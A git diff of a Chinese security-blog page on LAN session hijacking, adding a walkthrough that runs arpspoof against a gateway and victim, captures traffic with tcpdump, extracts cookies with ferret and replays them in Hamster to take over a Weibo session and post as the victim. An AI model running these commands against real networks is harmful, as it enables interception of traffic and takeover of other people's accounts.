@@ -26,7 +26,15 @@
 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。">
 <meta property="og:image" content="http://y00z.github.io/images/pasted-63.PNG">
 <meta property="og:image" content="http://y00z.github.io/images/pasted-64.PNG">
-<meta property="og:updated_time" content="2017-04-14T17:18:24.934Z">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-83.jpg">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-84.jpg">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-85.jpg">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-86.jpg">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-80.jpg">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-87.jpg">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-82.jpg">
+<meta property="og:image" content="http://y00z.github.io/images/pasted-81.jpg">
+<meta property="og:updated_time" content="2017-04-16T10:09:03.940Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="内网王者之会话劫持">
 <meta name="twitter:description" content="前言
@@ -194,6 +202,52 @@
 </blockquote>
 <p>受害者<br> <img src="/images/pasted-63.PNG" alt=""></p>
 <p>攻击者<br> <img src="/images/pasted-64.PNG" alt=""></p>
+<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>用到的工具</p>
+<ul>
+<li>ferret </li>
+<li>tcpdump </li>
+<li>Hamster</li>
+</ul>
+<p>其中ferret没有64位的，如果用的64位系统，需要安卓32位的ferret，而32位自带ferret。</p>
+<p>添加对32位应用程序的支持</p>
+<ul>
+<li>dpkg –add-architecture i386</li>
+</ul>
+<p>安装32位ferret</p>
+<ul>
+<li>sudo aptitude install ferret-sidejack:i386</li>
+</ul>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>首先arp走一波，前面的文章我有介绍到ettercap，今天这里介绍一个小巧的arp工具。arpspoof </p>
+<ul>
+<li>arpspoof -i eth0 -t 192.168.1.1 192.168.1.101</li>
+<li>-i 网卡名</li>
+<li>-t 网关和受害者ip</li>
+</ul>
+<p><img src="/images/pasted-83.jpg" alt=""></p>
+<p>然后使用tcpdump来捕获数据包。</p>
+<ul>
+<li>tcpdump -i eth0 -w data.cap</li>
+<li>-i 网卡名</li>
+<li>-w 保存的数据包</li>
+</ul>
+<p><img src="/images/pasted-84.jpg" alt=""></p>
+<p><strong>这个时候受害者登录微博。</strong></p>
+<p>接下来使用ferret来处理数据包。</p>
+<ul>
+<li>ferret -r data.cap</li>
+</ul>
+<p><img src="/images/pasted-85.jpg" alt=""></p>
+<p>处理完成后会在本地生成一个hamster.txt文件。</p>
+<p>然后运行hamster。</p>
+<p><img src="/images/pasted-86.jpg" alt=""></p>
+<p>我们需要打开设置代理。</p>
+<p><img src="/images/pasted-80.jpg" alt=""></p>
+<p>设置完成后，打开浏进入127.0.0.1:1234，找关键信息。</p>
+<p><img src="/images/pasted-87.jpg" alt=""></p>
+<p>劫持成功。</p>
+<p><img src="/images/pasted-82.jpg" alt=""></p>
+<p>同时也可以发微博</p>
+<p><img src="/images/pasted-81.jpg" alt=""></p>
 
       
 
